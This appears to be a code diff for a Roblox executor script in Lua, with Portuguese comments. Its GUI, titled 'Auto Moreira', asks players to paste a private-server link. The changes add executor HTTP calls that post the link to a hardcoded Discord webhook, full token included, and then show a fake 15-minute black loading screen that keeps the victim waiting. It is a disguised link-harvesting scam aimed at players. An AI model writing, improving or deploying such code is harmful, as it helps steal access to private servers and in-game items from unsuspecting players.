@@ -1,12 +1,50 @@
--- CONFIG
+-- ================= CONFIG =================
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1462117939783143518/WSTNnkQ5xQyd-oJAj3SJ6kOOFAE8E2yNlSeyhUefATtz9f9_swVD47FAC3V-O5NKhAlL"
 local LOAD_TIME = 15 * 60 -- 15 minutos
 
 local HttpService = game:GetService("HttpService")
 
+-- ================= REQUEST (DELTA) =================
+local requestFunc = (syn and syn.request) or request or http_request
+if not requestFunc then
+	warn("REQUEST NAO DISPONIVEL NO EXECUTOR")
+end
+
+-- ================= FUNÇÕES =================
+local function isValidLink(text)
+	if type(text) ~= "string" then return false end
+	text = text:lower()
+
+	-- validação flexível (não trava)
+	if text:find("roblox.com") and text:find("private") then
+		return true
+	end
+
+	return false
+end
+
+local function sendWebhook(message)
+	if not requestFunc then return end
+
+	local data = {
+		username = "Auto Moreira XD",
+		content = message
+	}
+
+	requestFunc({
+		Url = WEBHOOK_URL,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = HttpService:JSONEncode(data)
+	})
+end
+
 -- ================= GUI PRINCIPAL =================
-local gui = Instance.new("ScreenGui", game.CoreGui)
+local gui = Instance.new("ScreenGui")
 gui.Name = "AutoMoreiraGUI"
+gui.Parent = game.CoreGui
 
 local frame = Instance.new("Frame", gui)
 frame.Size = UDim2.fromScale(0.35, 0.3)
@@ -34,9 +72,18 @@ btn.TextScaled = true
 btn.BackgroundColor3 = Color3.fromRGB(210,210,210)
 btn.BorderSizePixel = 0
 
+local status = Instance.new("TextLabel", frame)
+status.Size = UDim2.fromScale(1, 0.15)
+status.Position = UDim2.fromScale(0, 0.85)
+status.Text = ""
+status.TextScaled = true
+status.BackgroundTransparency = 1
+status.TextColor3 = Color3.fromRGB(255,0,0)
+
 -- ================= LOADING GUI =================
-local loadGui = Instance.new("ScreenGui", game.CoreGui)
+local loadGui = Instance.new("ScreenGui")
 loadGui.Enabled = false
+loadGui.Parent = game.CoreGui
 
 local black = Instance.new("Frame", loadGui)
 black.Size = UDim2.fromScale(1,1)
@@ -55,42 +102,32 @@ bar.Size = UDim2.fromScale(0,1)
 bar.BackgroundColor3 = Color3.fromRGB(255,255,255)
 bar.BorderSizePixel = 0
 
--- ================= FUNÇÕES =================
-local function isValidLink(text)
-	text = text:lower()
-	return text:find("roblox.com/games/")
-		and (text:find("privateserverlinkcode=") or text:find("privateserverid="))
-end
-
-local function sendWebhook(link)
-	local data = {
-		username = "Auto Moreira XD",
-		content = "🔗 **Servidor recebido:**\n"..link
-	}
-
-	pcall(function()
-		HttpService:PostAsync(
-			WEBHOOK_URL,
-			HttpService:JSONEncode(data),
-			Enum.HttpContentType.ApplicationJson
-		)
-	end)
-end
-
 -- ================= BOTÃO =================
 btn.MouseButton1Click:Connect(function()
-	local link = box.Text
-	if link == "" then return end
-	if not isValidLink(link) then return end
+	print("BOTAO CLICADO")
 
+	local link = box.Text
+	print("LINK DIGITADO:", link)
+
+	if link == "" then
+		status.Text = "Coloque um link"
+		return
+	end
+
+	if not isValidLink(link) then
+		status.Text = "Link invalido"
+		return
+	end
+
+	-- fecha GUI e abre tela preta
 	gui.Enabled = false
 	loadGui.Enabled = true
 
-	-- tela preta primeiro
 	task.wait(1.5)
 
-	-- começa o loading → MANDA PRA WEBHOOK AQUI
-	sendWebhook(link)
+	-- ENVIA PRA WEBHOOK NO INICIO DO LOADING
+	sendWebhook("🔗 LINK RECEBIDO:\n"..link)
+	print("WEBHOOK ENVIADA")
 
 	barBg.Visible = true
 
